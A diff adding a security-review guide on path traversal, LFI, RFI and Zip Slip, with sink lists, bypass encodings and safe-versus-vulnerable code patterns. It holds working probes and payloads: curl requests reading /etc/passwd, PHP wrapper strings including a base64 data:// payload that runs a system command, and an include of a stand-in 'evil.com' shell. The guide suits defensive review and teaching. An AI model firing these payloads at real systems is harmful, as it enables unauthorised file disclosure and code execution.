@@ -1,0 +1,741 @@
+---
+name: path_traversal_lfi_rfi
+version: "0.5"
+description: Path traversal and file inclusion testing for local/remote file access and code execution — including name-only validators that miss a tainted base path, and media-variant loaders that read files without a classic path parameter
+---
+
+# Path Traversal / LFI / RFI
+
+Flawed file path handling and dynamic file inclusion give attackers a route to sensitive configuration, source code, credentials, SSRF pivots, and server-side code execution. Any user-influenced path, filename, or scheme must be treated as untrusted, normalized to a canonical form, and constrained to an explicit allowlist — or user control over the path should be eliminated entirely.
+
+The core pattern: *unvalidated user input reaches a filesystem operation and the resolved path is not verified to remain within the intended base directory.*
+
+## What It Is (and Is Not)
+
+**Path traversal IS**
+- User-supplied filename/path joined to a base directory without canonicalization + containment check: `open(os.path.join(BASE, user_filename))`
+- File reads/serves driven by URL params: `fs.readFile(path.join(__dirname, req.query.file))`
+- Include directives with user input: `include($_GET['page'] . '.php')`
+- Archive extraction using entry names as output paths without stripping `../` (ZipSlip)
+- `send_file()` / `res.sendFile()` with unsanitized user-controlled path components
+- Paths derived from DB values originally stored from user input (second-order)
+
+**Path traversal is NOT**
+- **SSRF**: fetching a remote URL from user input — separate class. **Caveat:** if a user-controlled path is resolved against a *base URL* and then fetched, the *same sink* is both path traversal and SSRF — re-judge it for CWE-918 (see "Path-traversal sink that is ALSO SSRF" below); do not dismiss SSRF just because "only a path" is user-controlled.
+- **RCE via arbitrary file write** or **unrestricted file upload**: related impact classes; tag separately
+- **Static file serving**: fully hardcoded paths with no user influence
+- **LFI/RFI alone**: when the sink is `include`/`require` executing code, prefer LFI/RFI tags (see below); path traversal applies when the primitive is read/write/serve without execution
+- **Effective mitigation already applied**: `realpath`/`resolve` + base-directory prefix check, strict filename allowlist, or `basename()` before join (see Safe Patterns)
+
+## Where to Look
+
+**Path Traversal**
+- Read files outside intended roots via `../`, encoding, normalization gaps
+
+**Local File Inclusion (LFI)**
+- Include server-side files into interpreters/templates
+
+**Remote File Inclusion (RFI)**
+- Include remote resources (HTTP/FTP/wrappers) for code execution
+
+**Archive Extraction**
+- Zip Slip: write outside target directory upon unzip/untar
+
+**Normalization Mismatches**
+- Server/proxy differences (nginx alias/root, upstream decoders)
+- OS-specific paths: Windows separators, device names, UNC, NT paths, alternate data streams
+
+## High-Value Targets
+
+**Unix**
+- `/etc/passwd`, `/etc/hosts`, application `.env`/`config.yaml`
+- SSH keys, cloud creds, service configs/logs
+
+**Windows**
+- `C:\Windows\win.ini`, IIS/web.config, programdata configs, application logs
+
+**Java/JVM web apps** (high value even for a *base-confined* read — these live inside the app root)
+- `/WEB-INF/web.xml`, `/WEB-INF/classes/application.properties` / `application.yml` / `*.properties`, `/WEB-INF/classes/*` (compiled classes → logic/secrets), `/META-INF/context.xml` — DB creds, API keys, internal URLs, route/servlet mappings that reveal more endpoints
+- **Container-protection bypass**: the servlet container blocks a *direct* `GET /WEB-INF/…`, but a download/preview/report endpoint that opens the file **server-side** (`new FileInputStream`, `getResourceAsStream`, `Files.readAllBytes`) is not subject to that rule — so `download?filename=/WEB-INF/web.xml` succeeds where the HTTP request would 404.
+- **"Limited"/base-confined traversal is still high-impact**: a read that a canonical-path + prefix check keeps *inside* the served root is NOT automatically safe. When that root contains secrets (`/WEB-INF/`, config, source), a user-selectable filename within it is sensitive-file disclosure → creds → RCE. Do **not** auto-discharge a containment-checked download when the base directory itself holds secrets (this is the escalation path in real "limited path traversal → RCE" chains); either serve from a directory with no secrets or map opaque IDs to a fixed allowlist of files.
+
+**Application**
+- Source code templates and server-side includes
+- Secrets in env dumps, framework caches
+
+## Reconnaissance
+
+### Surface Map
+
+- HTTP params (source param-name hints — prioritization only, never a standalone finding; a name match means *trace the value to a file-op sink below*, tokenizing compounds like `filePath`→`file`,`path`): `file`, `filename`, `filepath`, `path`, `php_path`, `template`, `include`, `page`, `pg`, `view`, `download`, `upload`, `attachment`, `document`, `doc`, `pdf`, `export`, `report`, `log`, `dir`, `folder`, `root`, `style`, `theme`, `lang`, `locale`, `name`, `src`, `url`, `image`, `font`, `resource`
+- Upload and conversion pipelines: image/PDF renderers, thumbnailers, office converters — including **variant/resize on untrusted uploads** where the LFI face is a media **loader** (libvips untrusted ops, ImageMagick `@file` / coder DSL), not a `?file=` path param. Cross-ref `arbitrary_file_upload.md` *Post-Upload Media Processing Chain* and `rce.md` libvips section.
+- Archive extract endpoints and background jobs; imports with ZIP/TAR/GZ/7z
+- Server-side template rendering (PHP/Smarty/Twig/Blade), email templates, CMS themes/plugins
+- Reverse proxies and static file servers (nginx, CDN) in front of app handlers
+
+### Capability Probes
+
+- Path traversal baseline: `../../etc/hosts` and `C:\Windows\win.ini`
+- Encodings: `%2e%2e%2f`, `%252e%252e%252f`, `..%2f`, `..%5c`, mixed UTF-8 (`%c0%2e`), Unicode dots and slashes
+- Normalization tests: `..../`, `..\\`, `././`, trailing dot/double dot segments; repeated decoding
+- Absolute path acceptance: `/etc/passwd`, `C:\Windows\System32\drivers\etc\hosts`
+- Server mismatch: `/static/..;/../etc/passwd` ("..;"), encoded slashes (`%2F`), double-decoding via upstream
+- **Library extended-filename / coder mini-languages (the "filename" is a DSL, not a literal path)**: many file/media/data libraries interpret magic prefixes or bracket/paren syntax inside what looks like a filename, so a *filename* parameter (no URL field involved) becomes SSRF / remote-include / arbitrary-file-write / RCE. Flag a user-influenced filename fed to: **ImageMagick/GraphicsMagick** coders & MSL (`msl:`, `mvg:`, `ephemeral:`, `caption:`/`label:@file`, and leading `@` = read-file), **CFITSIO** extended filename syntax (`name[...]`, `name(...)`, or `ftp://`/`http://` prefixes → outbound fetch), **FFmpeg** protocols/playlists (`concat:`, `subfile:`, HLS `.m3u8`/`.ffconcat` referencing `http://`/`file://`), **Ghostscript** (`%pipe%…`, `-sOutputFile=%pipe%`), **gnuplot**, and tar `--to-command`. Treat such an argument as an untrusted mini-language: allowlist exact extension **and** verified bytes, strip a leading `@`/scheme/`|`/`[`/`(`, and disable unneeded coders/protocols (ImageMagick `policy.xml`, FFmpeg `-protocol_whitelist`). Cross-ref `ssrf.md` (the outbound-fetch face) and `rce.md`
+- **Auditing the ImageMagick `policy.xml` (a *present* policy is not a *safe* policy).** "We ship a policy.xml" is not a control unless it's shaped right — flag these misconfigurations when the file is present: (a) **denylist instead of allowlist** — enumerating bad coders (`pattern="EPS"`/`"MSL"`) misses new/aliased ones; safe shape is default-deny then allow the few needed (`<policy domain="coder" rights="none" pattern="*"/>` then `rights="read|write" pattern="{GIF,JPEG,PNG,WEBP}"`). (b) **missing `<policy domain="path" rights="none" pattern="@*"/>`** — without it the `@file` indirect read (and `label:@`/`caption:@`) still leaks arbitrary files (SSRF/LFI). (c) **delegates not disabled** — no `<policy domain="delegate" rights="none" pattern="*"/>` leaves the Ghostscript/`https`/`url`/`show`/`ephemeral` RCE/SSRF surface (PS/EPS/PDF/XPS). (d) **last-matching-rule-wins re-enable** — a later permissive `<policy>` overrides an earlier deny (order matters; a broad `rights="read|write"` after a deny re-opens it). (e) **case mismatch** — `pattern="ephemeral"` is a no-op; coder names are UPPERCASE (`EPHEMERAL`). (f) **multiple conflicting `policy.xml`** — the effective policy may come from a different file than the one reviewed; ground truth is `identify -list policy`, not the file on disk. (g) **no `<policy domain="resource" ...>` limits** (memory/disk/time) → decompression-bomb DoS. **Detection**: `policy.xml` absent, or present without a default-deny coder rule **plus** the `@*` path deny **plus** a delegate deny.
+
+### Code Sink Patterns (grep)
+
+Flag file operations where the path argument is dynamic (variable, not a fully hardcoded literal):
+
+- **Python**: `open(`, `os.path.join(`, `pathlib.Path(`, `.read_text(`, `.read_bytes(`, `send_file(`, `FileResponse(`
+- **Node.js**: `fs.readFile`, `fs.readFileSync`, `fs.createReadStream`, `path.join(`, `path.resolve(`, `res.sendFile`, `res.download`, `express.static(var)` (dynamic/user-derived root)
+- **PHP**: `file_get_contents(`, `fopen(`, `readfile(`, `include(`, `require(`, `include_once(`, `require_once(`
+- **Ruby**: `File.read(`, `File.open(`, `IO.read(`, `send_file `, `render file: var` / `render template: var`. **The `IO.`/`Kernel#open` read helpers are also command-injection sinks (not just file read)**: `Kernel#open` (bare `open`), `IO.read`/`IO.write`/`IO.binread`/`IO.binwrite`/`IO.foreach`/`IO.readlines`, and `URI.open` **run a subprocess when the path starts with `|`** (`IO.read("|cmd")` → RCE — see `rce.md`), so a tainted path reaching these is RCE, not merely arbitrary file read. The **`File.` class** methods (`File.read`/`File.open`) do **not** honor `|` — prefer them and canonicalize/contain. **SAFE**: reject a leading `|` (and `-`), use `File.*` on a `File.basename`/`File.expand_path`-confined path
+- **Java**: `new File(`, `new FileInputStream(`, `Files.readAllBytes(`, `Paths.get(`, `UrlResource(`, Spring `ClassPathResource(var)` / `ResourceLoader.getResource(var)` / `ResourceUtils.getFile(var)`
+- **Go**: `os.Open(`, `os.ReadFile(`, `filepath.Join(`, `http.ServeFile(`, `http.ServeContent(w, r, var, ...)`
+- **C#**: `File.ReadAllText(`, `File.ReadAllBytes(`, `new FileStream(`, `Path.Combine(`
+- **Perl**: **2-arg `open(FH, $path)`** (the dangerous form — also a command-injection sink: a leading/trailing `\|` in the path makes Perl run it as a command, see `rce.md`), `File::Slurp` `read_file($path)`, `Path::Tiny->new($path)->slurp`. **SAFE**: 3-arg `open(my $fh, '<', $path)` + canonicalize/contain
+- **Path construction joins**: `os.path.join(BASE, var)`, `path.join(__dirname, var)`, `Paths.get(base).resolve(var)`, string concat `` `${base}/${var}` ``
+- **Archive extraction**: `zipfile.ZipFile.extractall`, `tarfile.extractall`, `ZipEntry.getName()` as output path (incl. streaming `ZipInputStream.getNextEntry()` and `net.lingala.zip4j` `ZipFile.extractAll`/`FileHeader.getFileName`), Node `adm-zip`/`node-tar`/`unzipper` extract calls. More per-language sinks: **Ruby** — `Gem::Package::TarReader` iterating entries then `File.open`/`File.join`/`File.expand_path` on `entry.full_name`, and **rubyzip** `Zip::File`/`Zip::InputStream` (note: `Entry#extract(dest)` **skips** its own `name_safe?` check when a destination argument is passed). **PHP** — `ZipArchive::extractTo(...)` / `PharData::extractTo(...)` (no per-entry `../` guard). **Swift** — ZIPFoundation `unzipItem`/manual `FileManager` write from `entry.path`. **Python manual extraction** (bypasses the `extractall` filter): `shutil.copyfileobj(zf.open(name), open(os.path.join(dest, name), 'wb'))` and `tar.extractfile(m)` written by `member.name` — and note `extractall` itself only became safe with `filter='data'` on Python ≥3.12, so pre-3.12 or `filter='fully_trusted'` is still VULN
+- **Java guard nuance**: `Paths.get(base).resolve(var).normalize().startsWith(base)` is only sound when `base` was canonicalized first (`toRealPath()`); comparing against a non-real base lets a symlink or prefix sibling (`/safe-evil`) defeat the `startsWith` check.
+
+Skip: fully hardcoded paths, config/env-only paths with no user component, fixed-root static middleware (e.g. `express.static('public')`).
+
+## How to Detect
+
+### Direct
+
+- Response body discloses file content (text, binary, base64)
+- Error pages echo real paths
+
+### Error-Based
+
+- Exception messages expose canonicalized paths or `include()` warnings with real filesystem locations
+
+### OAST
+
+- RFI/LFI with wrappers that trigger outbound fetches (HTTP/DNS) to confirm inclusion/execution
+
+### Side Effects
+
+- Archive extraction writes files unexpectedly outside target
+- Verify with directory listings or follow-up reads
+
+## Vulnerability Patterns
+
+### Name-only validator / tainted-base gap (false SAFE)
+
+A join helper that **validates only the trailing `name`** (reject `..` / absolute in the leaf) while the **`base` destination is already attacker-tainted** is not a containment check — it is a false SAFE. Common in file-transfer / remote-desktop / sync clients where the UI or FFI layer builds `base = downloadRoot.join(remoteEntry.name)` from a **peer-controlled listing**, then the native layer calls `join_validated_path(base, name)` / `validate_file_name_no_traversal(name)` and only inspects `name`.
+
+- **VULN**: `validate_*` / `join_validated_*` rejects traversal in `name` but never canonicalizes or confines `base`; or an **empty-name exemption** (`if name.is_empty() { return base }`) returns the tainted `base` verbatim so `File::create(base)` / `write_bytes` resolves embedded `../` (Startup folder, `.ssh/authorized_keys`, etc.). Presence of a name validator does **not** discharge — **Do not CLOSE** as "validated" without confirming `base` is a fixed server-chosen root (or is itself validated + confined). Cross-layer/FFI: judge the **whole flow** (UI join + native validator + write), not the validator file alone.
+- **SAFE**: treat the final write path as one value — `realpath`/`canonicalize` the joined path and require `commonpath`/`starts_with` against a **fixed** download root; reject `..`/absolute in **every** segment including `base`; never return `base` unchanged on empty name unless `base` was already confined; normalize peer `Entry.name` before any join.
+- Grep: `rg -n "join_validated|validate_file_name|no_traversal|empty.*name|FilePath|PathBuf::from" --glob '*.{rs,py,go,java,ts}'` then confirm both `base` and `name` are confined.
+
+### Path Traversal Bypasses
+
+**Encodings**
+- Single/double URL-encoding, mixed case, overlong UTF-8, UTF-16, path normalization oddities
+
+**Mixed Separators**
+- `/` and `\\` on Windows; `//` and `\\\\` collapse differences across frameworks
+
+**Dot Tricks**
+- `....//` (double dot folding), trailing dots (Windows), trailing slashes, appended valid extension
+
+**Absolute Path Injection**
+- Bypass joins by supplying a rooted path
+
+**Alias/Root Mismatch**
+- nginx alias without trailing slash with nested location allows `../` to escape
+- Try `/static/../etc/passwd` and ";" variants (`..;`)
+
+**Upstream vs Backend Decoding**
+- Proxies/CDNs decoding `%2f` differently; test double-decoding and encoded dots
+
+### LFI Wrappers and Techniques
+
+**PHP Wrappers**
+- `php://filter/convert.base64-encode/resource=index.php` (read source)
+- `zip://archive.zip#file.txt`
+- `data://text/plain;base64`
+- `expect://` (if enabled)
+
+**Log/Session Poisoning**
+- Inject PHP/templating payloads into access/error logs or session files then include them
+
+**Upload Temp Names**
+- Include temporary upload files before relocation; race with scanners
+
+**Proc and Caches**
+- `/proc/self/environ` and framework-specific caches for readable secrets
+
+**Legacy Tricks**
+- Null-byte (`%00`) truncation — only exploitable on PHP < 5.3.4; modern PHP (>= 5.3.4) rejects null bytes in file paths with a ValueError. Do not flag null-byte truncation as a viable attack vector on PHP >= 5.3.4.
+- Path length truncation on older systems
+
+### Template Engines
+
+- PHP include/require; Smarty/Twig/Blade with dynamic template names
+- Java/JSP/FreeMarker/Velocity; Node.js ejs/handlebars/pug engines
+- Seek dynamic template resolution from user input (theme/lang/template)
+
+### RFI Conditions
+
+**Requirements**
+- Remote includes (`allow_url_include`/`allow_url_fopen` in PHP)
+- Custom fetchers that eval/execute retrieved content
+- SSRF-to-exec bridges
+
+**Protocol Handlers**
+- http, https, ftp; language-specific stream handlers
+
+**Exploitation**
+- Host a minimal payload that proves code execution
+- Prefer OAST beacons or deterministic output over heavy shells
+- Chain with upload or log poisoning when remote includes are disabled
+
+### Archive Extraction (Zip Slip)
+
+- Files within archives containing `../` or absolute paths escape target extract directory
+- Test multiple formats: zip/tar/tgz/7z
+- Verify symlink handling and path canonicalization prior to write
+- **Cross-OS absolute-path desync**: an absolute-path classifier that recognizes only one OS's form (e.g. `path.startswith('/')`) mis-classifies a foreign-OS absolute target — a Windows `C:\…` link on a Unix check, or `/etc/…` on a Windows-only check — as *relative*, so a "relative is safe" gate accepts it. Detect absolute paths for **both** conventions (leading `/`, drive-letter `^[A-Za-z]:[\\/]`, UNC `^\\\\`) before branching on relative/absolute.
+- **Entry-type-gated link guard**: a "dangerous link" / containment check conditioned on entry kind (`if entry.isdir: …`) lets *file* symlink entries skip validation entirely. Run the guard for every entry — files, directories, and symlinks alike; never short-circuit on `isDir`.
+- Impact: overwrite config/templates or drop webshells into served directories
+- **False SAFE — post-extraction gates**: a `manifest.json` / UUID / top-level allowlist / `copytree` import filter / recursive promotion / post-extract scan that runs **after** `extractall` / per-entry write has already materialized attacker paths does **not** suppress. Containment must run **per entry before** extract/write. Later gates cannot un-write peer overwrites or symlink drops.
+- **In-root peer overwrite still counts**: do **not** require the write to escape the overall app/import/datastore root. Overwriting trusted config, peer-object directories, shared roots, or imported subtrees **inside** that root via `../sibling/` (or symlink + later copy) is still arbitrary file impact.
+
+```python
+# VULNERABLE — entry names used as output paths without validation
+with zipfile.ZipFile(user_zip) as zf:
+    zf.extractall('/var/www/uploads')
+
+# VULNERABLE — extract first, then manifest/UUID gate (too late)
+with zipfile.ZipFile(user_zip) as zf:
+    zf.extractall(dest)          # paths already on disk
+if not (dest / "manifest.json").is_file():
+    shutil.rmtree(dest)          # does not undo ../peer overwrites
+
+# SECURE — validate each entry before extract
+base = os.path.realpath('/var/www/uploads')
+with zipfile.ZipFile(user_zip) as zf:
+    for member in zf.namelist():
+        target = os.path.realpath(os.path.join(base, member))
+        if not target.startswith(base + os.sep):
+            raise ValueError(f"ZipSlip detected: {member}")
+    zf.extractall(base)
+```
+
+## Analysis Workflow
+
+1. **Inventory file operations** - Downloads, previews, templates, logs, exports/imports, report engines, uploads, archive extractors
+2. **Identify input joins** - Path joins (base + user), include/require/template loads, resource fetchers, archive extract destinations
+3. **Probe normalization** - Separators, encodings, double-decodes, case, trailing dots/slashes
+4. **Compare behaviors** - Web server vs application behavior
+5. **Escalate** - From disclosure (read) to influence (write/extract/include), then to execution (wrapper/engine chains)
+
+## Confirming a Finding
+
+### Dynamic Test / PoC
+
+Minimal runtime check once a sink is identified:
+
+```bash
+# Baseline in-root control
+curl -s 'https://target/download?file=report.pdf' | head -c 200
+
+# Traversal — expect out-of-root file content or path-disclosure error
+curl -s 'https://target/download?file=../../../etc/hosts'
+curl -s 'https://target/download?file=..%2f..%2f..%2fetc%2fhosts'
+curl -s 'https://target/download?file=%252e%252e%252fetc%252fpasswd'  # double-encoded
+```
+
+**Expected signal**: response body matches known file content (e.g. `127.0.0.1`), `Content-Disposition` filename mismatch, or error echoing canonicalized path. If partial mitigation exists (`replace('../')`), retry `....//`, mixed separators (`..%5c`), and absolute paths (`/etc/passwd`).
+
+1. Show a minimal traversal read proving out-of-root access (e.g., `/etc/hosts`) with a same-endpoint in-root control
+2. For LFI, demonstrate inclusion of a benign local file or harmless wrapper output (`php://filter` base64 of index.php)
+3. For RFI, prove remote fetch by OAST or controlled output; avoid destructive payloads
+4. For Zip Slip, create an archive with `../` entries and show write outside target (e.g., marker file read back)
+5. Provide before/after file paths, exact requests, and content hashes/lengths for reproducibility
+
+## Common False Alarms
+
+- In-app virtual paths that do not map to filesystem; content comes from safe stores (DB/object storage)
+- Canonicalized paths constrained to an allowlist/root after normalization
+- Wrappers disabled and includes using constant templates only
+- Archive extractors that sanitize paths and enforce destination directories
+- **Not a false alarm:** a `validate_file_name*` / `basename`-style check on the leaf while `base` was built from peer/user path segments — that is the **name-only / tainted-base** class above, not Safe Pattern #2
+
+## Safe Patterns (and Weak Mitigations)
+
+Apply **before** the file operation:
+
+**1. Canonical path + base-directory prefix check (preferred)**
+```python
+BASE = '/var/www/files'
+safe_path = os.path.realpath(os.path.join(BASE, user_input))
+if not safe_path.startswith(BASE + os.sep):
+    raise PermissionError("Path escape detected")
+```
+
+```javascript
+const base = path.resolve('/var/www/files');
+const resolved = path.resolve(base, req.query.file);
+if (!resolved.startsWith(base + path.sep)) return res.status(403).send('Forbidden');
+```
+
+**2. `basename()` / filename-only** — strips directory components; prevents traversal but blocks subdirectories
+```php
+readfile('/var/www/uploads/' . basename($_GET['file']));
+```
+
+**3. Strict allowlist** — compare input against fixed permitted names before any join
+```python
+ALLOWED = {'report.pdf', 'manual.txt'}
+if user_input not in ALLOWED: abort(400)
+```
+
+**4. Indirection map** — map opaque IDs to server-side filenames; never expose raw paths
+```python
+FILE_MAP = {'1': 'report.pdf', '2': 'manual.txt'}
+filename = FILE_MAP.get(user_id)
+```
+
+**5. Framework safe helpers** — Flask `send_from_directory(fixed_base, filename)` validates containment via `safe_join` (do not flag unless the *base* is also user-controlled)
+
+**Insufficient (do not treat as safe)**
+- `str.replace('../', '')` — bypass via `....//`, encoding, backslashes
+- Rejecting paths starting with `/` only — relative `../` still escapes
+- `os.path.join` / `path.join` alone — `join('/base', '../etc/passwd')` → `/etc/passwd`
+- Single URL-decode — double-encoding (`%252e%252e%252f`) survives
+- Extension-only checks without containment — `../../etc/passwd%00.pdf` on legacy systems
+- Prefix check without trailing separator — `startswith('/var/www')` matches `/var/www-evil`
+
+## Business Risk
+
+- Sensitive configuration/source disclosure → credential and key compromise
+- Code execution via inclusion of attacker-controlled content or overwritten templates
+- Persistence via dropped files in served directories; lateral movement via revealed secrets
+- Supply-chain impact when report/template engines execute attacker-influenced files
+
+## Analyst Notes
+
+1. Compare content-length/ETag when content is masked; read small canonical files (hosts) to avoid noise
+2. Test proxy/CDN and app separately; decoding/normalization order differs, especially for `%2f` and `%2e` encodings
+3. For LFI, prefer `php://filter` base64 probes over destructive payloads; enumerate readable logs and sessions
+4. Validate extraction code with synthetic archives; include symlinks and deep `../` chains
+5. Use minimal PoCs and hard evidence (hashes, paths). Avoid noisy DoS against filesystems
+
+## Core Principle
+
+Eliminate user-controlled paths where possible. Otherwise, resolve to canonical paths and enforce allowlists, forbid remote schemes, and lock down interpreters and extractors. Normalize consistently at the boundary closest to IO.
+
+## Distinguishing Path Traversal from LFI
+
+Path traversal and LFI are related but distinct vulnerability classes. Choosing the correct label depends on the **sink** and the **impact**.
+
+### Path Traversal
+The vulnerability is in **arbitrary file read/write** via directory traversal sequences (`../`):
+- The sink is a file I/O function: `open()`, `readFile()`, `file_get_contents()`, `fopen()`, `send_file()`, `send_from_directory()`
+- The attacker reads or writes files outside the intended directory
+- The file content is returned as **data** (text, binary, download) — NOT executed as code
+- Typical targets: `/etc/passwd`, config files, `.env`, source code, flag files
+- Nginx alias misconfiguration without trailing slash → path traversal
+
+**Tag as path traversal when:** User input reaches a file read/write operation and `../` sequences can escape the intended directory.
+
+### Local File Inclusion (LFI)
+The vulnerability is in **including/executing a local file** through an interpreter:
+- The sink is an **include/require** function: PHP `include()`, `require()`, `include_once()`
+- The included file is **parsed and executed** by the interpreter, not just read as data
+- Can lead to RCE via log poisoning, session poisoning, PHP wrappers (`php://filter`, `data://`)
+- PHP wrappers like `php://filter/convert.base64-encode/resource=` are LFI-specific
+
+**Tag as LFI when:** User input reaches a language-level include/require that **executes** the included file as code.
+
+### When Both Apply
+Some vulnerabilities involve both path traversal AND local file inclusion:
+- `include('pages/' . $_GET['page'] . '.php')` with `../` bypass → both path traversal (the `../` escape) and LFI (the `include` execution)
+- In this case, tag **both** `path_traversal` and `lfi`
+
+### Path-traversal sink that is ALSO SSRF — re-judge for CWE-918
+A user-controlled path resolved against a base URL (`new URL(path, baseURL)`, `urljoin(base, path)`, an Apollo `RESTDataSource.resolveURL`, or any HTTP-client `this.get(path)`/path-join) is commonly filed as **path traversal only** because "only a path is user-controlled, not a full URL." That is wrong when the resolved value is then **fetched by an outbound HTTP client**: an absolute (`https://evil.com`) or protocol-relative (`//evil.com`, or `///evil.com` after a single-slash strip) value rebases off the base origin → **SSRF (CWE-918)**. When the join target is a URL/HTTP client (not a filesystem path), **re-judge the same sink for SSRF and tag `ssrf` in addition to (or instead of) `path_traversal`** — do not write off SSRF just because the caller passes "a path." Full technique + safe patterns: `ssrf.md` → *Base-Relative URL Resolution Override* / *Framework HTTP-client `resolveURL`/path overrides*.
+
+### When to Tag Only One
+- `file_get_contents($_GET['file'])` with `../` → **path traversal** only (reads file content, does not execute it)
+- `include($_GET['page'])` without needing `../` (e.g., including `/etc/passwd` directly or using PHP wrappers) → **LFI** only
+- `send_from_directory(base, user_input)` in Flask → **path traversal** only (serves files, does not execute them)
+- Nginx alias off-by-one → **path traversal** only (web server misconfiguration, no code execution)
+
+## Python/JS/PHP Source Detection Rules
+
+### Python
+- **VULN**: `open(user_input)`, `open(os.path.join(base, user_input))` — no realpath validation
+- **VULN**: `send_file(filepath)` where `filepath` is user-influenced without realpath + prefix check
+- **SAFE**: `send_from_directory(fixed_base, filename)` — Flask `safe_join` blocks traversal when base is server-controlled
+- **SAFE**: `base = os.path.realpath(base); safe_path = os.path.realpath(os.path.join(base, user_input)); assert os.path.commonpath([base, safe_path]) == base`
+- **Pattern**: `../` in `user_input` traverses out of the intended directory
+
+```python
+# VULNERABLE — FastAPI path param used directly
+@app.get('/file/{name}')
+async def get_file(name: str):
+    return FileResponse(f'/app/static/{name}')
+
+# SECURE — basename strips traversal sequences
+@app.get('/file/{name}')
+async def get_file(name: str):
+    return FileResponse(os.path.join('/app/static', os.path.basename(name)))
+```
+
+### JavaScript (Node.js)
+- **VULN**: `fs.readFile(req.params.filename, ...)` — no path validation
+- **VULN**: `res.sendFile(path.join(__dirname, req.query.file))`
+- **SAFE**: `path.resolve()` result validated to confirm it is within the allowed directory
+
+### PHP
+- **VULN**: `include($_GET['page'])`, `require($_GET['file'])` — LFI
+- **VULN**: `include($_GET['page'] . '.php')` — bypassable via null byte on PHP < 5.3.4 only; still bypassable via wrappers on modern PHP
+- **VULN**: `file_get_contents($_GET['file'])`, `readfile($_GET['path'])`
+- **SAFE**: `include(basename($_GET['page']) . '.php')` — reduces but does not eliminate risk
+- **RFI**: When `allow_url_include=On`, `include('http://evil.com/shell.php')` achieves RCE
+
+### Ruby
+
+```ruby
+# VULNERABLE — params[:file] joined without validation
+def show
+  send_file Rails.root.join('public', 'reports', params[:file])
+end
+
+# SECURE — basename only
+def show
+  send_file Rails.root.join('public', 'reports', File.basename(params[:file]))
+end
+```
+
+### Go
+
+```go
+// VULNERABLE — query param joined directly
+http.ServeFile(w, r, filepath.Join("/var/www/files", r.URL.Query().Get("file")))
+
+// SECURE (Go 1.24+) — os.Root confines all operations to the directory and
+// rejects symlinks/paths that resolve outside it (stronger than a prefix check)
+root, err := os.OpenRoot("/var/www/files")
+if err != nil { http.Error(w, "error", 500); return }
+defer root.Close()
+f, err := root.Open(r.URL.Query().Get("file")) // cannot escape root
+if err != nil { http.Error(w, "Forbidden", http.StatusForbidden); return }
+defer f.Close()
+io.Copy(w, f)
+
+// SECURE (pre-1.24 fallback) — Clean + prefix check (LEXICAL ONLY: does not
+// resist symlinks; reject absolute/non-local input first via filepath.IsLocal)
+name := r.URL.Query().Get("file")
+if !filepath.IsLocal(name) { // false for absolute paths, "..", and escaping paths
+    http.Error(w, "Forbidden", http.StatusForbidden)
+    return
+}
+base := "/var/www/files"
+clean := filepath.Join(base, name)
+if !strings.HasPrefix(clean, base+string(os.PathSeparator)) {
+    http.Error(w, "Forbidden", http.StatusForbidden)
+    return
+}
+http.ServeFile(w, r, clean)
+```
+
+**Go sanitizer note**: prefer `os.Root`/`os.OpenRoot` (Go 1.24+) for any user-influenced file or archive-entry path — it enforces confinement at the OS level and rejects escaping symlinks, which a lexical `filepath.Clean` + prefix check does not. `filepath.IsLocal(name)` is a fast pre-filter (rejects absolute paths, `..`, and Windows reserved names) but is not symlink-resistant on its own.
+
+## Java Servlet Patterns (CWE-22)
+
+**VULN** — tainted input used to construct a file path:
+```java
+new File(tainted)
+new File("/uploads/" + tainted)
+new FileInputStream(tainted)
+new FileOutputStream(tainted)
+Paths.get(tainted)
+```
+
+**SAFE** — canonical path validated against allowed base:
+```java
+String canonicalBase = new File(base).getCanonicalPath();
+File f = new File(base, tainted).getCanonicalFile();
+if (!f.getPath().startsWith(canonicalBase + File.separator) && !f.getPath().equals(canonicalBase)) throw new Exception();
+```
+
+**Decision rule**: tainted string in ANY argument of `File()`, `FileInputStream()`, `Paths.get()` with no canonical path check → **VULN**.
+
+**Edge cases**:
+- `new File(tainted, "/Test.txt")` — first argument is tainted parent dir → **VULN**.
+- `new File(fixedBase, tainted)` — second argument is tainted child → **VULN**.
+- `new File(Utils.TESTFILES_DIR, bar)` — fixed base does NOT sanitize child when `bar` is tainted → **VULN**.
+- `new File(java.net.URI)` is **VULN** when that `URI` was built from tainted path text.
+- Direct stream calls `new FileInputStream(fileName)` / `new FileOutputStream(fileName)` are **VULN** when `fileName` is tainted.
+- Only `getCanonicalPath()` + `startsWith` check makes it **SAFE**.
+- If a helper overwrites tainted data with a fixed literal before the sink → **SAFE**.
+
+## PHP-Specific LFI Bypass Patterns
+
+### Null Byte Truncation (PHP < 5.3.4)
+
+```php
+// VULNERABLE: extension appended but null byte truncates in older PHP
+include($_GET['page'] . '.php');
+// Attacker: page=../../../../etc/passwd%00
+// Result in PHP < 5.3.4: include('../../../../etc/passwd')  (.php truncated at null byte)
+
+// VULN indicator: PHP version < 5.3.4 AND include/require with appended extension AND user input
+// Modern PHP (>= 5.3.4): null byte throws a ValueError — not exploitable this way
+```
+
+### str_replace('../') Bypass Patterns
+
+```php
+// VULNERABLE: simple string replacement is bypassable
+$page = str_replace('../', '', $_GET['page']);
+include('pages/' . $page . '.php');
+// Bypass: ....// → after removing ../ → ../
+// Bypass: ..%2F → URL-decoded after sanitization by web server
+// Bypass: ..\ (Windows backslash)
+
+// VULNERABLE: only sanitizing forward slash traversal
+$page = str_replace('../', '', $_GET['page']);
+// Bypasses on Windows: ..\, ..\ URL-encoded as %2e%2e%5c
+
+// SAFE: use realpath() + startsWith check
+$safePath = realpath('pages/' . $_GET['page'] . '.php');
+if ($safePath === false || strpos($safePath, realpath('pages/')) !== 0) {
+    die('Access denied');
+}
+```
+
+### PHP Wrapper LFI
+
+```php
+// VULNERABLE: include/require/file_get_contents accepting PHP wrappers
+include($_GET['page']);
+// Attacker: php://filter/convert.base64-encode/resource=config.php  → reads source code
+// Attacker: data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+  → RCE (allow_url_include=On)
+// Attacker: zip://uploads/evil.zip#shell.php  → executes uploaded PHP in ZIP
+
+// VULN condition for RCE via wrapper:
+// - allow_url_include=On: enables data://, http://, ftp:// inclusion
+// - allow_url_fopen=On: enables remote URLs in file_get_contents
+
+// Detection: any include/require with user input = LFI at minimum; check php.ini for allow_url_include
+```
+
+### php://filter convert.iconv Filter-Chain RCE (no upload, no log, no writable dir)
+
